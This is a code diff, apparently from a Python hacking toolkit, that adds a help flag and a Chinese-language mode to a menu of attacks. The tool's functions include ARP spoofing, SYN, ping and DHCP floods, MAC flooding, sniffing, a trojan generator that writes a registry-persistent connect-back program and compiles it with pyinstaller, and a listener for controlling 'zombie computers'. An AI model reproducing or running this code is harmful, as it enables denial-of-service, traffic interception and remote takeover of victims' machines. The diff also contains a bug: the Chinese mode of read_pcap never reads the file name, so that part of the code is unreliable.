@@ -23,10 +23,18 @@ except:
 import random, sys, uuid, os#导入需要的自带模块
 import socket as sk
 
+chinses_mode = False
 argv = sys.argv
 for i in argv:
-    if i == "-G":
+    if i == "--help" or i == "-h":
+        print("python run.py [-G] [-z]")
+        print("use -G run in GUI mode.")
+        print("use -z run in chinese mode.")
+        sys.exit(0)
+    elif i == "-G":
         import GUI
+    elif i == "-z":
+        chinses_mode = True
 
 print("The program must be run in utf-8.")#不知道为什么总有人用其他编码导致中文出问题。
 print("必须以UTF-8编码运行程序")
@@ -86,9 +94,13 @@ print("password list read...Done")
 user_list = ["root"]
 
 def ARP_poof_with_not_ARPping():#ARP欺骗不带ARPPing
-    
-    target = input("Enter the target IP like 127.0.0.1:")#目标输入不用我多说把。
-    router = input("Please enter the router IP address like 192.168.1.1:")
+
+    if chinses_mode:
+        target = input("请输入目标IP地址:")  # 目标输入不用我多说把。
+        router = input("请输入网关IP地址:")
+    else:
+        target = input("Enter the target IP like 127.0.0.1:")
+        router = input("Please enter the router IP address like 192.168.1.1:")
 
     packet = Ether()/ARP(psrc=router,pdst=target)#生成攻击数据包
     packet_two = Ether()/ARP(psrc=target,pdst=router)
@@ -102,8 +114,12 @@ def ARP_poof_with_not_ARPping():#ARP欺骗不带ARPPing
 
 def ARP_poof(): #ARP欺骗带ARPPing(内网用)。 PS:ARPPing用来确认主机是否存活
 
-    target = input("Enter the target IP like 127.0.0.1:")#目标输入不用我多说把。
-    router = input("Please enter the router IP address like 192.168.1.1:")
+    if chinses_mode:
+        target = input("请输入目标IP地址:")  # 目标输入不用我多说把。
+        router = input("请输入网关IP地址:")
+    else:
+        target = input("Enter the target IP like 127.0.0.1:")
+        router = input("Please enter the router IP address like 192.168.1.1:")
 
     arp_Ping_fall = False#初始化变量
     arp_test = False
@@ -140,8 +156,12 @@ def ARP_poof(): #ARP欺骗带ARPPing(内网用)。 PS:ARPPing用来确认主机�
             break
 
 def SYN_flood(): #SYN flood attack SYN洪水不用我说把
-    target = input("Enter the target IP like 127.0.0.1:")#必须有的目标输入。
-    port = input("enter port:")#攻击端口
+    if chinses_mode:
+        target = input("请输入目标IP:")  # 必须有的目标输入。
+        port = input("请输入目标端口:")  # 攻击端口
+    else:
+        target = input("Enter the target IP like 127.0.0.1:")#必须有的目标输入。
+        port = input("enter port:")#攻击端口
 
     while True:#攻击主循环
         try:#一个ctrl + c退出模块自己体会
@@ -150,11 +170,17 @@ def SYN_flood(): #SYN flood attack SYN洪水不用我说把
             break
 
 def nmap_port_scan():#nmap扫描所有端口状态
-    target = input("Enter the target IP like 127.0.0.1:")
+    if chinses_mode:
+        target = input("请输入目标IP地址或网段IP地址:")
+    else:
+        target = input("Enter the target IP like 127.0.0.1:")
     nm = nmap.PortScanner()
     tick = time.time()
     nm.scan(target, '1-9999')
-    print("scan in ", time.time() - tick, "seconds.")
+    if chinses_mode:
+        print("扫描使用了", time.time() - tick, "秒。")
+    else:
+        print("scan in ", time.time() - tick, "seconds.")
     for host in nm.all_hosts():#在nmap的扫描结果里的所有主机进行分析
         print('-----------------------------------')
         print('Host:%s(%s)'%(host,nm[host].hostname()))#打印计算机名称
@@ -176,7 +202,10 @@ def DHCP_flood():
             break
 
 def death_ping():
-    target = input("Enter the target like 127.0.0.1:")
+    if chinses_mode:
+        target = input("请输入目标IP:")
+    else:
+        target = input("Enter the target like 127.0.0.1:")
     while True:
         send(IP(src=target,dst=RandIP())/ICMP())
 
@@ -190,7 +219,10 @@ def scapy_sniff():
     else:
         data = sniff(iface=iface,prn=lambda x:x.summary())
 
-    print("Start analyzing packets...")
+    if chinses_mode:
+        print("开始保存数据包...")
+    else:
+        print("Start analyzing packets...")
     file = "sniff_data/" + time.strftime('%Y_%m_%d_%H_%M_%S') + ".pcap"
     writer = PcapWriter(file, append = True)
     for i in data:
@@ -199,8 +231,10 @@ def scapy_sniff():
     writer.close()
 
 def read_pcap():
-
-    file_name = input("Enter the pcap file name like 2019_11_02_16_55_22.pcap:")#输入pcap文件名
+    if chinses_mode:
+        print("请输入pcap文件名:")
+    else:
+        file_name = input("Enter the pcap file name like 2019_11_02_16_55_22.pcap:")#输入pcap文件名
     file_name = "sniff_data/" + file_name#组合文件路径
     reader = PcapReader(file_name)#用scapy打开pcap文件
     packets = reader.read_all(-1)#读取所有储存的数据包
@@ -217,9 +251,14 @@ def macof():
             break
 
 def Generate_trojan_virus():
-    name = input("Enter virus name:")
-    lhost = input("Enter connect host:")
-    lport = input("Enter connect port:")
+    if chinses_mode:
+        name = input("请输入病毒名:")
+        lhost = input("请输入你想让病毒连接的主机IP:")
+        lport = input("请输入主机端口:")
+    else:
+        name = input("Enter virus name:")
+        lhost = input("Enter connect host:")
+        lport = input("Enter connect port:")
     file = open("virus/" + name + ".py",'w')
     file.write('import socket, os, time\n')
     file.write('os.system("REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v lol /t REG_SZ /d " + os.getcwd() + "\\\\' + name + '.exe /f")\n')#你好你的注册表被xx了
@@ -235,8 +274,12 @@ def Generate_trojan_virus():
     os.system("pyinstaller -F virus/" + name + ".py")
 
 def countrol_zombie_computer():
-    listen_host = input("Enter the listen host ip like 127.0.0.1:")
-    listen_port = input("Enter the listen port like 80:")
+    if chinses_mode:
+        listen_host = input("请输入你的IP:")
+        listen_port = input("请输入你连接的端口:")
+    else:
+        listen_host = input("Enter the listen host ip like 127.0.0.1:")
+        listen_port = input("Enter the listen port like 80:")
     s = socket.socket()
     s.bind((listen_host,int(listen_port)))
     s.listen(1)
@@ -251,43 +294,51 @@ def countrol_zombie_computer():
 
 def trace_router():
     dport = []
-    target = input("Enter the target IP or domain:")
-    dport.append(int(input("Enter the connect port:")))
+    if chinses_mode:
+        target = input("请输入目标域名或IP地址:")
+        dport.append(int(input("请输入端口:")))
+    else:
+        target = input("Enter the target IP or domain:")
+        dport.append(int(input("Enter the connect port:")))
     res, unans = traceroute(target, dport=dport, retry=-2)
     time.sleep(1)
 
-print("Setup in ", time.time() - tick, "seconds.")#初始化计时
+if chinses_mode:
+    print("启动用了", time.time() - tick, "秒。")
+else:
+    print("Setup in ", time.time() - tick, "seconds.")#初始化计时
 while True:#喜闻乐见的主循环
     os_command = False
     tool_number = 13
-
     print("如果要选择插件请输入插件名字")
-    print("quit(0)")#告诉用户对应的功能
-    print("ARPspoof with ARPPing.(1)")
-    print("SYN flood(2)")
-    print("All port status scans(3)")
-    print("Death of Ping(4)")
-    print("Sniff(5)")
-    print("Read Save pcap file(6)")
-    print("ARPspoof with not ARPPing(7)")
-    print("macof(8)")
-    print("DHCP flood(9)")
-    print("Generate trojan virus(10)")
-    print("Control zombie computer(11)")
-    print("Trace router(12)")
-    print("退出(0)")
-    print("ARP欺骗带ARPPing(内网用)。(1)")
-    print("SYN洪水(2)")
-    print("所有端口状态扫描(3)")
-    print("死亡之Ping(4)")
-    print("sniff嗅探(5)")
-    print("读取已保存的pcap文件 注:推荐使用Wireshark(6)")
-    print("ARP欺骗不带ARPPing版(7)")
-    print("伪macof(8)")
-    print("DHCP洪水(9)")
-    print("生成木马病毒(10)")
-    print("控制肉鸡(11)")
-    print("路由跟踪(12)")
+    if not chinses_mode:
+        print("quit(0)")#告诉用户对应的功能
+        print("ARPspoof with ARPPing.(1)")
+        print("SYN flood(2)")
+        print("All port status scans(3)")
+        print("Death of Ping(4)")
+        print("Sniff(5)")
+        print("Read Save pcap file(6)")
+        print("ARPspoof with not ARPPing(7)")
+        print("macof(8)")
+        print("DHCP flood(9)")
+        print("Generate trojan virus(10)")
+        print("Control zombie computer(11)")
+        print("Trace router(12)")
+    if chinses_mode:
+        print("退出(0)")
+        print("ARP欺骗带ARPPing(内网用)。(1)")
+        print("SYN洪水(2)")
+        print("所有端口状态扫描(3)")
+        print("死亡之Ping(4)")
+        print("sniff嗅探(5)")
+        print("读取已保存的pcap文件 注:推荐使用Wireshark(6)")
+        print("ARP欺骗不带ARPPing版(7)")
+        print("伪macof(8)")
+        print("DHCP洪水(9)")
+        print("生成木马病毒(10)")
+        print("控制肉鸡(11)")
+        print("路由跟踪(12)")
     print("------------------pulgins-------------------")
     for i in plugins_list:
         print(i + "(" + str(tool_number) + ")")
